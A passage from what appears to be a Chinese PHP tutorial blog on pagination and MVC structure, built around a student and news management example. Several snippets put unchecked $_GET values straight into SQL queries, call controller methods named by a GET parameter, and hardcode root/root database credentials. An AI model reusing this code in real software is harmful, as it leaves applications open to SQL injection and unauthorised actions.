class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//包含连接数据库的公共文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//每页显示条数</span></span><br><span class="line">$pagesize = <span class="number">10</span>;</span><br><span class="line"><span class="comment">//获取当前页码和计算开始行号</span></span><br><span class="line">$page = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>]) ? $_GET[<span class="string">&#x27;page&#x27;</span>] : <span class="number">1</span>;</span><br><span class="line">$startrow = ($page<span class="number">-1</span>)*$pagesize;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取总记录数和计算总页数</span></span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM student&quot;</span>;</span><br><span class="line">$records = $db-&gt;rowCount($sql);</span><br><span class="line">$pages = ceil($records/$pagesize);</span><br><span class="line"></span><br><span class="line"><span class="comment">//构建分页查询的SQL语句</span></span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM student ORDER BY id DESC LIMIT <span class="subst">&#123;$startrow&#125;</span>,<span class="subst">&#123;$pagesize&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//获取多行数据</span></span><br><span class="line">$arrs = $db-&gt;fetchAll($sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=<span class="string">&quot;text-align: center;padding-bottom:10px;&quot;</span>&gt;</span><br><span class="line">&lt;h2&gt;学生信息管理中心&lt;/h2&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;&quot;</span>&gt;添加学生&lt;/a&gt; </span><br><span class="line">共有&lt;font color=<span class="string">&#x27;red&#x27;</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $records<span class="meta">?&gt;</span>&lt;/font&gt;个学生</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;table width=<span class="string">&#x27;600&#x27;</span> border=<span class="string">&#x27;1&#x27;</span> bordercolor=<span class="string">&#x27;#ccc&#x27;</span> rules=<span class="string">&quot;all&quot;</span> cellpadding=<span class="string">&quot;5&quot;</span> align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;tr bgcolor=<span class="string">&#x27;#f0f0f0&#x27;</span>&gt;</span><br><span class="line">&lt;th&gt;编号&lt;/th&gt;</span><br><span class="line">&lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">&lt;th&gt;性别&lt;/th&gt;</span><br><span class="line">&lt;th&gt;年龄&lt;/th&gt;</span><br><span class="line">&lt;th&gt;学历&lt;/th&gt;</span><br><span class="line">&lt;th&gt;工资&lt;/th&gt;</span><br><span class="line">&lt;th&gt;奖金&lt;/th&gt;</span><br><span class="line">&lt;th&gt;籍贯&lt;/th&gt;</span><br><span class="line">&lt;th&gt;操作选项&lt;/th&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//循环二维数组</span></span><br><span class="line"><span class="keyword">foreach</span>($arrs <span class="keyword">as</span> $arr)&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;tr align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;id&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;name&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;sex&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;age&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;edu&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;salary&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;bonus&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $arr[<span class="string">&#x27;city&#x27;</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;./edit.php&quot;</span>&gt;修改&lt;/a&gt; | </span><br><span class="line">&lt;a href=<span class="string">&quot;javascript:void(0)&quot;</span> onClick=<span class="string">&quot;confirmDel(&lt;?php echo <span class="subst">$arr</span>[&#x27;id&#x27;]?&gt;)&quot;</span>&gt;删除&lt;/a&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP核心编程6&quot;&gt;&lt;a href=&quot;#PHP核心编程6&quot; class=&quot;headerlink&quot; title=&quot;PHP核心编程6&quot;&gt;&lt;/a&gt;PHP核心编程6&lt;/h1&gt;&lt;h2 id=&quot;最终类和最终方法&quot;&gt;&lt;a href=&quot;#最终类和最终方法&quot; class=&quot;head</summary>
      
    
    
    
    <category term="PHP开发学习" scheme="http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="PHP开发学习" scheme="http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>PHP开发学习--核心编程1</title>
    <link href="http://s1eady.top/2019/12/30/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B--MVC%E6%80%9D%E6%83%B31/"/>
    <id>http://s1eady.top/2019/12/30/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B--MVC%E6%80%9D%E6%83%B31/</id>
    <published>2019-12-29T23:29:22.000Z</published>
    <updated>2020-11-23T07:41:33.906Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP核心编程–MVC思想1"><a href="#PHP核心编程–MVC思想1" class="headerlink" title="PHP核心编程–MVC思想1"></a>PHP核心编程–MVC思想1</h1><h2 id="MVC框架思想原理"><a href="#MVC框架思想原理" class="headerlink" title="MVC框架思想原理"></a>MVC框架思想原理</h2><h3 id="MVC概述"><a href="#MVC概述" class="headerlink" title="MVC概述"></a>MVC概述</h3><p>MVC全名是Model View Controller，是模型(model)－视图(view)－控制器(controller)的缩写；</p><p>MVC是一种软件设计典范，用一种业务逻辑、数据、界面显示分离的方法组织代码；</p><p>MVC中，每个模块只做自己范围内的事情，不是自己的事情千万不做；</p><h3 id="MVC各组件的功能"><a href="#MVC各组件的功能" class="headerlink" title="MVC各组件的功能"></a>MVC各组件的功能</h3><p>Model（数据模型）用于处理应用程序数据逻辑的部分。通常模型对象负责在数据库中存取数据。</p><p>View（视图）是用于处理数据显示的部分。通常视图是依据模型数据创建的。</p><p>Controller（控制器）是应用程序中处理用户交互的部分。通常控制器负责从视图读取数据，控制用户输入，并向模型发送数据。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201118154838078.png" alt="image-20201118154838078"></p><h2 id="MVC实例：学生信息管理"><a href="#MVC实例：学生信息管理" class="headerlink" title="MVC实例：学生信息管理"></a>MVC实例：学生信息管理</h2><h3 id="数据库工厂类三私一公"><a href="#数据库工厂类三私一公" class="headerlink" title="数据库工厂类三私一公"></a>数据库工厂类三私一公</h3><p>主要是创建数据库对象，进行数据库连接。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$config=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_host = $config[<span class="string">&#x27;db_host&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_user = $config[<span class="string">&#x27;db_user&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_pass = $config[<span class="string">&#x27;db_pass&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_name = $config[<span class="string">&#x27;db_name&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;charset = $config[<span class="string">&#x27;charset&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;connectDb(); <span class="comment">//连接MySQL服务器</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;selectDb();  <span class="comment">//选择数据库</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;setCharset();<span class="comment">//设置字符集</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="学生模型类"><a href="#学生模型类" class="headerlink" title="学生模型类"></a>学生模型类</h3><p>主要是连接数据库，对学生数据进行操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//包含数据库工具类</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Db.class.php&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//创建Db类对象</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;db_host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_user&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_pass&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_name&#x27;</span> =&gt; <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">$this</span>-&gt;db = Db::getInstance($arr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在学生模型类中调用数据库对象的某一个方法，其中sql语句自己定义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取多行数据</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchAll</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//构建查询的SQL语句</span></span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM student ORDER BY id DESC&quot;</span>;</span><br><span class="line"><span class="comment">//执行SQL语句，返回二维数组</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;fetchAll($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除记录</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//构建删除的SQL语句</span></span><br><span class="line">$sql = <span class="string">&quot;DELETE FROM student WHERE id=<span class="subst">&#123;$id&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//执行SQL语句，并返回布尔值</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;exec($sql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="学生类控制器"><a href="#学生类控制器" class="headerlink" title="学生类控制器"></a>学生类控制器</h3><p>主要是控制用户与数据进行交互，主要是用户交互。比如get、post参数等对应的操作，项目中有删除数据、添加数据等等操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;包含学生模型类</span><br><span class="line">require_once(&quot;.&#x2F;StudentModel.class.php&quot;);</span><br></pre></td></tr></table></figure><p>调用模型类中的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$modelObj &#x3D; new StudentModel();</span><br><span class="line">$arrs &#x3D; $modelObj-&gt;fetchAll();</span><br></pre></td></tr></table></figure><p>最后包含视图模型。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &quot;.&#x2F;StudentIndexView.html&quot;;</span><br></pre></td></tr></table></figure><h3 id="学生视图文件"><a href="#学生视图文件" class="headerlink" title="学生视图文件"></a>学生视图文件</h3><p>显示数据库中的数据，将数据输送到html页面</p><p>包含控制器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;.&#x2F;StudentController.php&quot;&gt;学生管理&lt;&#x2F;a&gt; | </span><br><span class="line">&lt;a href&#x3D;&quot;.&#x2F;NewsController.php&quot;&gt;新闻管理&lt;&#x2F;a&gt;&lt;hr&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;id&#39;]?&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;name&#39;]?&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;sex&#39;]?&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;age&#39;]?&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;edu&#39;]?&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;salary&#39;]?&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;bonus&#39;]?&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;city&#39;]?&gt;&lt;&#x2F;td&gt;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>模型类，创建数据库对象，与数据库进行连接，定义sql方法，执行sql语句。</p><p>控制器接受用户的操作，创建模型类对象，调用模型类对象方法，取出数据存入数组。</p><p>视图，将数据从控制器中取出，输出到html前端页面。</p><p>新闻功能也是如此。</p><h2 id="MVC实例：学生信息管理2"><a href="#MVC实例：学生信息管理2" class="headerlink" title="MVC实例：学生信息管理2"></a>MVC实例：学生信息管理2</h2><h3 id="整合学生模块和新闻模块并整合工厂模型类、基础模型类等等"><a href="#整合学生模块和新闻模块并整合工厂模型类、基础模型类等等" class="headerlink" title="整合学生模块和新闻模块并整合工厂模型类、基础模型类等等"></a>整合学生模块和新闻模块并整合工厂模型类、基础模型类等等</h3><h4 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h4><p>模型类主要是取出数据，多个模型类都有取出数据的功能，我们可以对其进行整合，整合共有的功能，其他模型类继承基础模型类。</p><p>我们将两个模型类中，公共的属性和方法，提炼出来，放入基础模型类(BaseModel.class.php)中。其它模型类完成对基础模型类的继承。</p><h4 id="创建基础模型类文件：BaseModel-class-php"><a href="#创建基础模型类文件：BaseModel-class-php" class="headerlink" title="创建基础模型类文件：BaseModel.class.php"></a>创建基础模型类文件：BaseModel.class.php</h4><p>公共部分放入基础模型类。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//包含数据库工具类</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Db.class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义抽象的基础模型类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseModel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//受保护的保存数据库对象的属性</span></span><br><span class="line"><span class="keyword">protected</span> $db = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//创建Db类对象</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;db_host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_user&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_pass&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_name&#x27;</span> =&gt; <span class="string">&#x27;itcast&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">$this</span>-&gt;db = Db::getInstance($arr);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他模型类</p><p>直接包含基础模型类，调用基础模型类中的对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class StudentModel extends BaseModel</span><br></pre></td></tr></table></figure><h4 id="创建工厂模型类：FactoryModel-class-php"><a href="#创建工厂模型类：FactoryModel-class-php" class="headerlink" title="创建工厂模型类：FactoryModel.class.php"></a>创建工厂模型类：FactoryModel.class.php</h4><p>生产模型类对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//包含所有模型类</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./StudentModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./NewsModel.class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义最终的工厂模型类</span></span><br><span class="line"><span class="comment">//主要用来生产不同模型类的对象</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">FactoryModel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//公共的静态的创建不同模型类对象的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params">$modelClassName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//创建指定模型类对象，并返回</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> $modelClassName();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>控制器创建模型类对象，直接使用工厂类创建对象，而不用单独的去创建某一个模型类对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$modelObj &#x3D; FactoryModel::getInstance(&quot;StudentModel&quot;);</span><br></pre></td></tr></table></figure><p>不使用工厂类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$modelObj &#x3D; new StudentModel();</span><br></pre></td></tr></table></figure><h4 id="创建控制器类：NewsController-php"><a href="#创建控制器类：NewsController-php" class="headerlink" title="创建控制器类：NewsController.php"></a>创建控制器类：NewsController.php</h4><p>一开始控制器是一个单纯的文件，进行接受用户输入的数据，执行用户的操作等，接下来把控制器变成一个控制器类。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义最终的新闻控制器类</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">NewsController</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$modelObj = FactoryModel::getInstance(<span class="string">&quot;NewsModel&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>($modelObj-&gt;delete($id))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;id=<span class="subst">&#123;$id&#125;</span>的记录删除成功！&lt;/h2&gt;&quot;</span>;</span><br><span class="line">header(<span class="string">&quot;refresh:3;url=?&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;id=<span class="subst">&#123;$id&#125;</span>的记录删除失败！&lt;/h2&gt;&quot;</span>;</span><br><span class="line">header(<span class="string">&quot;refresh:3;url=?&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$modelObj = FactoryModel::getInstance(<span class="string">&quot;NewsModel&quot;</span>);</span><br><span class="line">$arrs = $modelObj-&gt;fetchAll();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./NewsIndexView.html&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的用户操作，变成一个函数，通过创建控制器类。来调用相应的函数。</p><h4 id="创建基础控制器类：BaseController-class-php"><a href="#创建基础控制器类：BaseController-class-php" class="headerlink" title="创建基础控制器类：BaseController.class.php"></a>创建基础控制器类：BaseController.class.php</h4><p>与基础模型类一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义抽象的基础控制器类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//受保护的跳转方法</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">jump</span>(<span class="params">$message,$url=<span class="string">&#x27;?&#x27;</span>,$time=<span class="number">3</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;<span class="subst">&#123;$message&#125;</span>&lt;/h2&gt;&quot;</span>;</span><br><span class="line">header(<span class="string">&quot;refresh:<span class="subst">&#123;$time&#125;</span>;url=<span class="subst">&#123;$url&#125;</span>&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>(); <span class="comment">//中止程序向下运行</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>控制器调用基础控制器的方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取用户动作参数</span></span><br><span class="line">$ac = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;ac&#x27;</span>]) ? $_GET[<span class="string">&#x27;ac&#x27;</span>] : <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"><span class="comment">//创建新闻控制器类的对象</span></span><br><span class="line">$controllerObj = <span class="keyword">new</span> NewsController();</span><br><span class="line"><span class="comment">//根据用户的不同动作，调用不同的方法</span></span><br><span class="line">$controllerObj-&gt;$ac();</span><br></pre></td></tr></table></figure><h4 id="文件简单分目录"><a href="#文件简单分目录" class="headerlink" title="文件简单分目录"></a>文件简单分目录</h4><p>Model目录：主要存放各个模块的模型类文件；</p><p>Controller目录：主要存放各个模块的控制器类文件；</p><p>View目录：主要存放各个模块的视图文件；</p><p>Frame目录：主要存放各个模块公共的类文件。</p><h4 id="前端控制器实现"><a href="#前端控制器实现" class="headerlink" title="前端控制器实现"></a>前端控制器实现</h4><p>之前的index.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//包含所有类文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/BaseController.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/FactoryModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/Db.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/BaseModel.class.php&quot;</span>);</span><br><span class="line"><span 